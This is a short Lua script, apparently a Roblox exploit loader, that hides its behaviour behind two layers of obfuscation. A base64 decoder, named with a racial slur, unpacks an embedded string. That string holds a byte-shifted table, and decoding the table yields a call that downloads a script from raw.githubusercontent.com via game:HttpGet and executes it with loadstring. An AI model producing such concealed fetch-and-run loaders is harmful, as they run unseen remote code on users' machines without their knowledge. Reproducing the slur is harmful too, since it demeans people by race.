local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function niggerearlyaccess(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local code = ''
code = code .. 'bG9jYWwgZnVuY3Rpb24gcGxnZm5jd3Bodyh0KQogICAgbG9jYWwgciA9ICIiCiAgICBmb3IgXywgdiBpbiBpcGFpcnModCkgZG8K'
code = code .. 'ICAgICAgICByID0gciAuLiBzdHJpbmcuY2hhcigodiAtIDEpICUgMjU2KQogICAgZW5kCiAgICByZXR1cm4gcgplbmQKCmxvY2Fs'
code = code .. 'IG9iZnVzY2F0ZWQgPSB7MTA5LDExMiw5OCwxMDEsMTE2LDExNywxMTUsMTA2LDExMSwxMDQsNDEsMTA0LDk4LDExMCwxMDIsNTks'
code = code .. 'NzMsMTE3LDExNywxMTMsNzIsMTAyLDExNyw0MSwzNSwxMDUsMTE3LDExNywxMTMsMTE2LDU5LDQ4LDQ4LDExNSw5OCwxMjAsNDcs'
code = code .. 'MTA0LDEwNiwxMTcsMTA1LDExOCw5OSwxMTgsMTE2LDEwMiwxMTUsMTAwLDExMiwxMTEsMTE3LDEwMiwxMTEsMTE3LDQ3LDEwMCwx'
code = code .. 'MTIsMTEwLDQ4LDExNSw5OCwxMjAsMTA0LDEwNiwxMTcsMTA1LDExOCw5OSwxMTgsMTE2LDEwMiwxMTUsMTAwLDExMiwxMTEsMTE3'
code = code .. 'LDEwMiwxMTEsMTE3LDExOCwxMTYsMTAyLDExNSwxMDAsMTE1LDEwMiw5OCwxMTcsMTA2LDExMiwxMTEsNDgsMTE1LDk4LDEyMCwx'
code = code .. 'MDQsMTA2LDExNywxMDUsMTE4LDk5LDExOCwxMTYsMTAyLDExNSwxMDAsMTEyLDExMSwxMTcsMTAyLDExMSwxMTcsNDcsMTAwLDEx'
code = code .. 'MiwxMTAsNDgsMTEwLDk4LDEwNiwxMTEsNDgsMTA1LDExNywxMTcsMTEzLDExNiw0OCwzOCw1Miw2NiwzOCw1Miw2Niw0OCwxMTgs'
code = code .. 'MTE2LDEwMiwxMTUsMTAwLDExNSwxMDIsOTgsMTE3LDEwNiwxMTIsMTExLDQ4LDEwNSwxMTcsMTE3LDExMywxMTYsMzgsNTIsNjYs'
code = code .. 'NDgsMTE4LDExNiwxMDIsMTE1LDQ4LDExNSw5OCwxMjAsMTA0LDEwNiwxMTcsMTA1LDExOCw5OSwxMTgsMTE2LDEwMiwxMTUsMTAw'
code = code .. 'LDExMiwxMTEsMTE3LDEwMiwxMTEsMTE3LDQ3LDEwMCwxMTIsMTEwLDQ4LDEwNSwxMTcsMTE3LDExMywxMTYsMzgsNTIsNjYsNDgs'
code = code .. 'MTE1LDk4LDEyMCw0NywxMDksMTE4LDk4LDM1LDQ1LDMzLDExNywxMTUsMTE4LDEwMiw0Miw0Miw0MSw0Mn0KbG9hZHN0cmluZyhw'
code = code .. 'bGdmbmN3cGh3KG9iZnVzY2F0ZWQpKSgp'
loadstring(niggerearlyaccess(code))()
